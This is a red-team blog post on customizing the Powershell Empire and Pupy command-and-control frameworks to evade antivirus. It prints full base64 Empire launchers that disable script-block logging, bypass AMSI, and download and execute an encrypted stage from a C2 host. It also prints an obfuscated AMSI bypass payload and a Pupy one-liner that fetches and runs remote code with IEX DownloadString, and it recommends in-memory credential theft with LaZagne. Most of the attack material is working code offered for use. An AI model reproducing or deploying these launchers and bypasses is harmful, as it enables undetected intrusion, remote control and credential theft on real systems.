---
title: "Customizing C2-Frameworks for AV-Evasion"
layout: "post"
---

This post will cover how to edit open source Command & Control (C2) Frameworks source code for AV-Evasion.

## Introduction

In the last weeks i did the <a href="https://www.zeropointsecurity.co.uk/red-team-ops">Red Team Operator</a> course and made some new experiences with the open source C2-Framework <a href="https://github.com/cobbr/Covenant">Covenant</a> which is used in the course materials. When i began the course, there was no content for AV-Evasion and C2-Customization, so i did that with Covenant for myself. In the meantime, content for AV-Evasion has been added in the course materials, a part of that material has been released by Rastamouse <a href="https://offensivedefence.co.uk/posts/covenant-profiles-templates/">here</a>. 

In this blog post i´ll cover my approach on changing C2-Frameworks source code for AV-Evasion. It should be clear, that my approach will get flagged in the near future because it´s public, so i´ll recommend to make your own project afterwards.

The first part will cover customization of the good old <a href="https://github.com/BC-SECURITY/Empire">Powershell Empire</a>, which was my first contact to C2-Frameworks in the offensive security career.

The seccond part will cover <a href="https://github.com/n1nj4sec/pupy">Pupy</a>, which has some pretty unique modules and features.

Last but not least i´ll write about my Covenant approach.

So let´s jump right in!

## Powershell Empire

<a href="https://github.com/BC-SECURITY">BC-Security</a> did a really good job to further support and continue the Empire development. It feels like every week new features and improvements are implemented into the framework. Powershell Empire has several benefits that make it worth using the framework again and again. In my personal opinion the most important are:

* <b>LOTS</b> of modules, from privilege escalation to lateral movement, domain enumeration, credential harvesting, persistence and much more.
* Easy usage for the CLI, i didn´t use the <a href="https://github.com/BC-SECURITY/Starkiller">Starkiller</a> GUI so far.
* It´s pretty stable, agents stay alive, no or very little crashes
* Easy modifications or custom module integration possible

The default HTTP-Listener options, which are most used i think look like this:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/Listener.JPG">
</p>

If we stay with theese default options, set a listening Port and start the listener we can choose from wheather using a Powershell or Python launcher. The Python launcher is mentioned to be used for linux agents, so i won´t dive into that. A Powershell launcher with the default options looks like this:

```batch
Powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBlAFIAUwBJAG8ATgAuAE0AQQBKAE8AUgAgAC0ARwBFACAAMwApAHsAJABjADMAMgAyAD0AWwByAEUAZgBdAC4AQQBzAFMARQBNAGIATABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAGMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAYwAzADIAMgAuAEcARQBUAFYAQQBMAFUAZQAoACQATgB1AEwATAApADsASQBmACgAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBBAEwAPQBbAEMAbwBsAGwAZQBDAFQASQBvAG4AUwAuAEcARQBOAGUAcgBJAGMALgBEAEkAYwB0AGkATwBOAEEAUgB5AFsAUwB0AHIASQBOAGcALABTAFkAUwB0AEUAbQAuAE8AYgBKAGUAQwBUAF0AXQA6ADoAbgBlAHcAKAApADsAJABWAEEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAEwAUwBlAHsAWwBTAEMAcgBpAFAAdABCAEwAbwBjAGsAXQAuACIARwBFAFQARgBpAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUAZQAoACQATgB1AEwAbAAsACgATgBFAHcALQBPAEIAagBFAEMAVAAgAEMATwBMAEwAZQBDAFQASQBvAG4AUwAuAEcARQBOAGUAUgBJAGMALgBIAEEAUwBIAFMAZQBUAFsAUwB0AFIAaQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBTAFMAZQBtAGIAbABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAEYALgBHAEUAdABGAGkARQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBsAHUAZQAoACQATgB1AEwAbAAsACQAdABSAHUAZQApADsAfQA7AFsAUwBZAFMAVABlAE0ALgBOAGUAVAAuAFMAZQByAHYASQBDAEUAUABvAEkATgB0AE0AYQBOAEEAZwBlAFIAXQA6ADoARQB4AFAAZQBDAHQAMQAwADAAQwBvAG4AVABpAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4ARQB3AC0ATwBCAGoARQBDAHQAIABTAHkAcwBUAGUAbQAuAE4AZQBUAC4AVwBFAEIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBPAGQAaQBOAGcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQBUAFMAVAByAEkAbgBHACgAWwBDAG8AbgB2AGUAUgB0AF0AOgA6AEYAcgBvAE0AQgBBAFMARQA2ADQAUwB0AHIASQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAawBBAE0AZwBBAHUAQQBEAEUAQQBOAGcAQQA0AEEAQwA0AEEATQBRAEEAdwBBAEQAQQBBAEwAZwBBAHgAQQBEAE0AQQBNAFEAQQA2AEEARABnAEEATQBBAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAcgBPAFgAWQA9AFsAUwB5AHMAVABlAE0ALgBOAGUAVAAuAFcARQBCAFIARQBxAHUAZQBzAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAHIATwBYAHkAOwAkADUANwA5ADMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AEkAYQBsAHMAIAA9ACAAWwBTAFkAUwB0AEUAbQAuAE4ARQB0AC4AQwBSAGUAZABFAG4AVABpAEEATABDAEEAYwBIAGUAXQA6ADoARABlAEYAQQB1AEwAdABOAGUAdAB3AG8AcgBrAEMAcgBFAEQAZQBOAFQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAUwB0AEUATQAuAFQAZQB4AFQALgBFAG4AQwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBTACgAJwBHAGUAWABTAFoAbwApAHQARAAyADsAfQBDACwAUgBmADkAWQBqAEoANgBWAF0AewB2AE8AZAAlAEkARQAmACgAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABlAGEARABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBBAGEAcgBVAHEAagBhAFAAVwBBAFYATgA9AE8AYgBSAHMAQwAyAFYAUAB1ADAAcgBWAHIAcwAyADYASQBSACsAMAAxAGUANQBXAGsALwB3AD0AIgApADsAJABkAGEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcATgBsAE8AYQBkAEQAQQB0AGEAKAAkAFMARQBSACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQARABBAHQAYQBbADQALgAuACQAZABBAHQAYQAuAEwAZQBOAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
```

Executing this launcher on any windows system with AV-Software installed will most likely result in a blocked process and AV-Message. This has one of the following reasons:

* Many AV-Vendors have a module that blocks new Powershell processes spawned with the parameters "-noP -sta -w1 -enc" - the script content itself is not revelant at this point, everything is blocked
* AMSI is in use and blocks the BASE64 encoded script content

The parameters "-noP -sta -w1 -enc" basically execute the script without a Powershell Profile `-NoProfile`, with a Singlethread-Apartment `-Sta`, a hidden window is opened `-w1` and a base64 encoded command is executed `-enc`  - <a href="https://docs.microsoft.com/de-de/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1">Microsoft reference</a>. It is possible, that the usage of only one of theese parameters blocks the execution via AV-Module. To get around this source code changes cannot help. But you can avoid theese parameters and execute the decoded script instead.

We will now base64 decode the content of the launcher with the command `echo "Base64Content" | base64 -d`  to see, what exactly Empire is doing here. The base64 decoded content looks like this, i replaced some of the semicolons with a newline for a better overview:

```batch
If($PSVerSIonTAbLE.PSVeRSIoN.MAJOR -GE 3){$c322=[rEf].AsSEMbLY.GetTypE('System.Management.Automation.Utils')."GEtFie`LD"('cachedGroupPolicySettings','N'+'onPublic,Static')
IF($c322){$c742=$c322.GETVALUe($NuLL)
If($C742['ScriptB'+'lockLogging']){$c742['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$c742['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$VAL=[ColleCTIonS.GENerIc.DIctiONARy[StrINg,SYStEm.ObJeCT]]::new()
$VAL.ADd('EnableScriptB'+'lockLogging',0)
$Val.AdD('EnableScriptBlockInvocationLogging',0)
$c742['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val}ELSe{[SCriPtBLock]."GETFie`Ld"('signatures','N'+'onPublic,Static').SETVALUe($NuLl,(NEw-OBjECT COLLeCTIonS.GENeRIc.HASHSeT[StRiNg]))}$Ref=[REF].ASSemblY.GeTTYpe('System.Management.Automation.Amsi'+'Utils')
$REF.GEtFiELD('amsiInitF'+'ailed','NonPublic,Static').SETVAlue($NuLl,$tRue);}
[SYSTeM.NeT.ServICEPoINtMaNAgeR]::ExPeCt100ConTinUE=0;$5793=NEw-OBjECt SysTem.NeT.WEBClIeNt
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$ser=$([TeXt.ENCOdiNg]::UNicODe.GETSTrInG([ConveRt]::FroMBASE64StrING('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgAxADMAMQA6ADgAMAA=')))
$t='/login/process.php';$5793.HEADErs.Add('User-Agent',$u)
$5793.PrOXY=[SysTeM.NeT.WEBREquest]::DeFaULtWEBPrOXy;$5793.Proxy.CredentIals = [SYStEm.NEt.CRedEnTiALCAcHe]::DeFAuLtNetworkCrEDeNTIals
$Script:Proxy = $5793.Proxy;$K=[SyStEM.TexT.EnCodiNG]::ASCII.GEtByTES('GeXSZo)tD2;}C,Rf9YjJ6V]{vOd%IE&(')
$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I]
$_-bXoR$S[($S[$I]+$S[$H])%256]}};$5793.HeaDeRs.ADD("Cookie","AarUqjaPWAVN=ObRsC2VPu0rVrs26IR+01e5Wk/w=")
$daTa=$5793.DowNlOadDAta($SER+$T);$iv=$daTa[0..3];$DATa=$DAta[4..$dAta.LeNgth];-join[ChAr[]](& $R $dATa ($IV+$K))|IEX
```

If the Powershell version is 2 or lower, a big part of the launcher is not executed at all. That´s, because Powershell v2 has no AMSI and Script-block-logging support. In between the if statement there are different bypasses for the respective protection mechanisms, a Script-block-logging bypass and an AMSI-bypass. 

You can modify any Empire bypass in the `lib/common/bypasses.py` file of Empire:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/Bypasses_py.JPG">
</p>

If you wonder how to create your own custom bypass i recommend reading my older Blog Post <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">Bypass AMSI by manual modification</a>.

Let´s use <a href="https://github.com/RythmStick/AMSITrigger/tree/master/AMSITrigger">AMSITrigger</a> again to find the AMSI Trigger for our Empire launcher:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/AMSITriggerBase64.JPG">
</p>

It is that easy to base64 decode theese Triggers on the commandline, because the base64 signature is invalid - it´s only a part of the full base64 string. But using for example <a href="https://gchq.github.io/CyberChef/">CyberChef</a> with the recipe `From Base64` helps here:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/CyberChef.JPG">
</p>

So this is indeed the AMSI bypass which is the first Trigger.

We will use one <a href="https://amsi.fail/">Amsi.fail</a> payload to create an existing bypass with a custom signature:

```batch
#Matt Graebers Reflection method 
[Ref].AsSEMbly.GeTtype('System.Management.Automation.'+$([SYsTeM.NET.weButIlity]::HTmLDEcodE('&#65;&#109;&#115;&#105;'))+'Utils').GetField(''+$([CHAr]([BYTe]0x61)+[chAR](81+28)+[char](211-96)+[cHaR](149-44))+'InitFailed',$([CHaR]([byTe]0x4E)+[ChAr](198-87)+[CHaR](1980/18)+[CHAR](77+3)+[ChAr]([Byte]0x75)+[CHar](5684/58)+[cHAR]([BYte]0x6C)+[ChAR]([BYtE]0x69)+[ChaR]([BYTE]0x63)+[chAR]([bYtE]0x2C)+[ChAR]([Byte]0x53)+[cHAR](116)+[ChAR](97)+[chaR]([BytE]0x74)+[Char](68+37)+[cHAr](78+21))).SetValue($null,$true);
```

You can just paste a new AMSI bypass from the website into the bypass variable of `lib/common/bypasses.py`. But depending on the bypass you may have to escape some special characters. 

The seccond Trigger is for the HTTP-connection to the C2-Framework:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/CyberChef2.JPG">
</p>

We can see, that the User-Agent from the listener options menu, the base64 encoded IP-Address of your C2-Server, the URL for the connection and the proxy settings are flagged by AMSI. So Let´s change the values for the User-Agent and URL in our Listener menu:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/DefaultProfile.JPG">
</p>

The new launcher Code now looks like this:

```batch
Powershell -enc SQBGACgAJABQAFMAVgBFAHIAcwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAE8AbgAuAE0AQQBqAG8AUgAgAC0AZwBlACAAMwApAHsAWwBSAGUAZgBdAC4AQQBzAFMARQBNAGIAbAB5AC4ARwBlAFQAdAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACcAKwAkACgAWwBTAFkAcwBUAGUATQAuAE4ARQBUAC4AdwBlAEIAdQB0AEkAbABpAHQAeQBdADoAOgBIAFQAbQBMAEQARQBjAG8AZABFACgAJwAmACMANgA1ADsAJgAjADEAMAA5ADsAJgAjADEAMQA1ADsAJgAjADEAMAA1ADsAJwApACkAKwAnAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnACcAKwAkACgAWwBDAEgAQQByAF0AKABbAEIAWQBUAGUAXQAwAHgANgAxACkAKwBbAGMAaABBAFIAXQAoADgAMQArADIAOAApACsAWwBjAGgAYQByAF0AKAAyADEAMQAtADkANgApACsAWwBjAEgAYQBSAF0AKAAxADQAOQAtADQANAApACkAKwAnAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACQAKABbAEMASABhAFIAXQAoAFsAYgB5AFQAZQBdADAAeAA0AEUAKQArAFsAQwBoAEEAcgBdACgAMQA5ADgALQA4ADcAKQArAFsAQwBIAGEAUgBdACgAMQA5ADgAMAAvADEAOAApACsAWwBDAEgAQQBSAF0AKAA3ADcAKwAzACkAKwBbAEMAaABBAHIAXQAoAFsAQgB5AHQAZQBdADAAeAA3ADUAKQArAFsAQwBIAGEAcgBdACgANQA2ADgANAAvADUAOAApACsAWwBjAEgAQQBSAF0AKABbAEIAWQB0AGUAXQAwAHgANgBDACkAKwBbAEMAaABBAFIAXQAoAFsAQgBZAHQARQBdADAAeAA2ADkAKQArAFsAQwBoAGEAUgBdACgAWwBCAFkAVABFAF0AMAB4ADYAMwApACsAWwBjAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgAMgBDACkAKwBbAEMAaABBAFIAXQAoAFsAQgB5AHQAZQBdADAAeAA1ADMAKQArAFsAYwBIAEEAUgBdACgAMQAxADYAKQArAFsAQwBoAEEAUgBdACgAOQA3ACkAKwBbAGMAaABhAFIAXQAoAFsAQgB5AHQARQBdADAAeAA3ADQAKQArAFsAQwBoAGEAcgBdACgANgA4ACsAMwA3ACkAKwBbAGMASABBAHIAXQAoADcAOAArADIAMQApACkAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFMAZQByAFYAaQBjAGUAUABvAEkAbgBUAE0AQQBOAEEARwBlAFIAXQA6ADoARQBYAHAAZQBDAFQAMQAwADAAQwBPAG4AdABpAE4AdQBFAD0AMAA7ACQAYgAzADkAMAA0AD0ATgBlAHcALQBPAEIAagBFAEMAVAAgAFMAWQBTAFQAZQBtAC4ATgBFAHQALgBXAGUAQgBDAGwASQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAwAC4AMAA7ACAAVwBpAG4ANgA0ADsAIAB4ADYANAA7ACAAcgB2ADoANwAwAC4AMAApACAARwBlAGMAawBvAC8AMgAwADEAMAAwADEAMAAxACAARgBpAHIAZQBmAG8AeAAvADcAMAAuADAAJwA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBOAEMATwBEAGkAbgBHAF0AOgA6AFUATgBJAEMAbwBkAEUALgBHAGUAdABTAFQAUgBpAE4AZwAoAFsAQwBPAE4AdgBFAHIAVABdADoAOgBGAHIAbwBNAEIAYQBTAEUANgA0AFMAdABSAEkATgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAGsAQQBNAGcAQQB1AEEARABFAEEATgBnAEEANABBAEMANABBAE0AUQBBAHcAQQBEAEEAQQBMAGcAQQB4AEEARABNAEEATQBRAEEANgBBAEQAZwBBAE0AQQBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBfAGwAYQB5AG8AdQB0AHMALwAxADUALwBxAHUAaQBjAGsAbABpAG4AawBzAGQAaQBhAGwAbwBnAGYAbwByAG0ALgBhAHMAcAB4AD8AUABpAGMAawBlAHIARABpAGEAbABvAGcAVAB5AHAAZQA9AE0AaQBjAHIAbwBzAG8AZgB0AC4AUwBoAGEAcgBlAFAAbwBpAG4AdAAuAFcAZQBiAEMAbwBuAHQAcgBvAGwAcwAuAEkAdABlAG0AUABpAGMAawBlAHIARABpAGEAbABvAGcAJwA7ACQAQgAzADkAMAA0AC4ASABFAEEAZABFAFIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAYgAzADkAMAA0AC4AUAByAG8AWABZAD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBlAEIAUgBFAFEAVQBFAFMAdABdADoAOgBEAEUARgBBAFUATABUAFcAZQBCAFAAcgBvAHgAeQA7ACQAYgAzADkAMAA0AC4AUAByAE8AWABZAC4AQwBSAEUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwB5AFMAdABlAE0ALgBOAEUAVAAuAEMAcgBlAGQAZQBuAHQASQBBAGwAQwBBAGMAaABFAF0AOgA6AEQAZQBmAGEAVQBsAHQATgBlAHQAdwBPAHIAawBDAFIARQBEAGUATgB0AGkAYQBMAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAYgAzADkAMAA0AC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAcwBUAEUATQAuAFQAZQB4AFQALgBFAE4AQwBvAGQASQBuAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQAZQBTACgAJwBHAGUAWABTAFoAbwApAHQARAAyADsAfQBDACwAUgBmADkAWQBqAEoANgBWAF0AewB2AE8AZAAlAEkARQAmACgAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AVQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABCADMAOQAwADQALgBIAEUAQQBkAGUAUgBzAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEEAYQByAFUAcQBqAGEAUABXAEEAVgBOAD0AbQAyADQAMgBkADYAWAA2AHoAbQBwADgAQQBEAHkAaQB6ADAAMwA4AGQAVQBxAGQARwBwAHMAPQAiACkAOwAkAGQAYQB0AEEAPQAkAEIAMwA5ADAANAAuAEQATwB3AG4AbABvAEEARABEAEEAVABhACgAJABTAEUAUgArACQAVAApADsAJABJAHYAPQAkAEQAYQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AEEAPQAkAEQAQQB0AGEAWwA0AC4ALgAkAEQAQQBUAGEALgBsAGUAbgBHAFQAaABdADsALQBKAE8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

AMSITrigger returns `[+] AMSI_RESULT_NOT_DETECTED` and the execution leads to an successfull agent connection:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/Agent.JPG">
</p>

But what about all the modules in Empire? They are using Scripts, which are detected by AMSI as well and Empire is using new processes for modules so that we need a new bypass everytime we use a module. We have two options:

* We can modify each .ps1 file in the `data/module_source/` directory so that no one is flagged by AMSI. If you also modify the default stage2 script `data/agent/stagers/http.ps1` you even don´t need any AMSI bypass at all. This is a very large one-time effort, but detection becomes much more difficult. How to modify the scripts? Look at the older blog posts ;-)
* We can set the module options `AMSIBypass` and `Obfuscate` to true to that the modules are not flagged anymore. One downsite is that by not disabling Script-Block-Logging the detection rate is very high.

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/EmpireParameters.JPG">
</p>

`Obfuscate` is using <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> for every module with given options. I personally made the experience, that modifying every script one by one is more effective and reliable than using `AMSIBypass` and `Obfuscate`.


## Pupy C2

<a href="https://github.com/n1nj4sec/pupy">Pupy C2</a> has two main benefits, that i did not see in any other open source framework i´ve tested so far:

* Windows payloads load the entire Python interpreter from memory using a reflective DLL so that any Python script can be loaded and executed in memory as long as the dependency libraries are added
* The interactive shell module makes it possible to use a fully featured command line shell with autocompletion - it´s like sitting on the remote system with a cmd open
* Best linux system support i´ve seen so far, works like a charm

The in memory execution of Python code makes it possible to load for example <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> into memory, which is also integrated as module. In my personal opinion `LaZagne` is <b>the</b> round-house-kick for credentials on windows environments - using <a href="https://github.com/skelsec/pypykatz">pypykatz</a> for lsass-credentials plus browser credentials as well as several sysadmin-tool credentials. If someone else ever finds a method for `LaZagne` execution in memory on a windows host without python installed - via Powershell or .NET binary - i´m open for any DMs. This is one of the many personal projects i tried to archieve from time to time. 

Pupy also has several stager options from Android Packages up to Linux Binaries, Windows PE Executables and Powershell as well as Python oneliners:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/Pupystagers.JPG" width="500" height="500">
</p>

Generating a windows Powershell oneliner is as simple as `gen -f ps1_oneliner -O windows`:

<p align="center">
          <img src="/assets/posts/2020-11-14_C2_Customization/PupyStager.JPG">
</p>

Pupy is using two ports by default, one for a webserver hosting the payloads and another one for the incoming connections and C2-Commands via encrypted channel. The Powershell oneliners simply load a script from the pupy webserver - theese scripts are <b>huge</b>, because they contain a whole Python interpreter. Loading Stage2 can therefore sometimes take a while. The Pupy Powershell files of the webserver are located in the directory `/root/.config/pupy/data/wwwroot/`. Let´s take a look at the Stage1 payload named `7BLd42qxkI`:

```batch
$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWYgKCRFbnY6UFJPQ0VTU09SX0FSQ0hJVEVDVFVSRSAtZXEgJ0FNRDY0Jyl7IElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xMDAuMTMxOjQ0My96UkZ0aElLVElWL0tzb3RYa1Q4WkYnKTsgfSBlbHNlIHsgSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwMC4xMzE6NDQzL3pSRnRoSUtUSVYvekxpRHJHTnpHdCcpOyB9'));iex $code
``` 
Stage1 is normally not flagged by any vendor, because its just a function deciding wheather the victim system is x64 or x86. The base64 decoded script is as follows:

```batch
if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){ IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.131:443/zRFthIKTIV/KsotXkT8ZF'); } else { IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.131:443/zRFthIKTIV/zLiDrGNzGt'); }
```

